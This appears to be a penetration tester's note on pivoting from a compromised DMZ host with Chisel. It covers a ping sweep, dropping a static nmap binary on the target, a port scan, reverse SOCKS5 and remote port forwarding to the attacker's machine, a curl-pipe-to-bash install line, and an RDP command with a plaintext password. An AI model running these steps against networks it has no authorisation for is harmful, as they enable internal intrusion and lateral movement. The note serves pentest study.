# Chisel

is a tool using SOCKS and allows you to forward traffic from an local service
to your local machine.

---

Assuming we are in the DMZ (ssh'd into an server). We can check the ipconfig first to see all the networks.

```
ipconfig
10.1.2.239/24
```

Let's now scan the whole subnet using an bash ping script. This will provide us with all the hosts which are
online in the subnet.

```
for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1 & done | grep from
10.1.2.4
10.1.2.7
```

Let's now portscan the targets in the internal network. Using another bash script, but therefore we need to download the nmap binary onto the target machine. Depending on the target operating system and cpu architecture, I will choose an binary from here:

```
https://github.com/andrew-d/static-binaries
```

Downloaded binary locally and gave it executable rights.

```
chmod +x nmap
```

Transfered it onto target system.

```
wget http://<local_ip>/nmap nmap
```

Running nmap on the ip adresses discovered now

```
./nmap -sT -Pn 10.1.2.4
```

Since we now got information on running services of the hosts within the internal network, we can utilize "chisel" in order to access those services on our local kali machine.

## PoC Socks

It funnels ALL services in the internal network through the socks proxy --> our local machine and we can access everything utilizing proxy's, but we have to use foxyproxy and proxychains.

We need to configure proxychains.

```
mousepad /etc/proxychains4.conf
```

Scroll down all the way in the .conf file and modify the line where it says socks4 127.0.0.1 9050 to

```
socks5 127.0.0.1 1080
```

Or to whatever port is getting communicated in our chisel server.

Now after executing the below commands, we can access whatever internal service in the network.

On local machine.

```
chisel server --socks5 --reverse
2026/01/11 10:05:09 server: Reverse tunnelling enabled
2026/01/11 10:05:09 server: Fingerprint IfFARMa8BgPXCMUiiiLrVgaT5EstKlu+SS6k1+0eULM=
2026/01/11 10:05:09 server: Listening on http://0.0.0.0:8080
```

On target machine.

```
./chisel client --fingerprint IfFARMa8BgPXCMUiiiLrVgaT5EstKlu+SS6k1+0eULM= <local_ip>:8080 R:socks
```

In order to access the services or commands we can now use proxychains.

```
proxychains curl http://10.1.2.4
```

```
proxychains xfreerdp3 /cert:ignore /clipboard /compression /auto-reconnect /u:Stacy /p:'xNnWo6272k7x' /v:10.1.2.4 /w:1600 /h:800 /drive:test,/home/saitama/Desktop
```

This will display the website running internally on port 80.

We can also view it in the browser, but we'll need to access it via FoxyProxy.

Configuring the proxy first --> Protocoll = SOCKS5 --> Port 1080 --> IP 127.0.0.1

Activate the proxy and browse the website on http://10.1.2.4

## PoC Remote Port Forwarding

executing command on local instance

```
chisel server --socks5 --reverse
2026/01/11 10:05:09 server: Reverse tunnelling enabled
2026/01/11 10:05:09 server: Fingerprint IfFARMa8BgPXCMUiiiLrVgaT5EstKlu+SS6k1+0eULM=
2026/01/11 10:05:09 server: Listening on http://0.0.0.0:8080
```

Download chisel binary onto target system or transfer it from local machine.

```
curl https://i.jpillora.com/chisel! | bash
```

On Target machine:

This will execute an reverse connection to our local machine and funnel the 10.1.2.4 endpoint on port 80 to our local machine on port 8000 --> we can access the webpage on 127.0.0.1:8000

```
./chisel client --fingerprint IfFARMa8BgPXCMUiiiLrVgaT5EstKlu+SS6k1+0eULM= <local_ip>:8080 R:8000:10.1.2.4:80
```
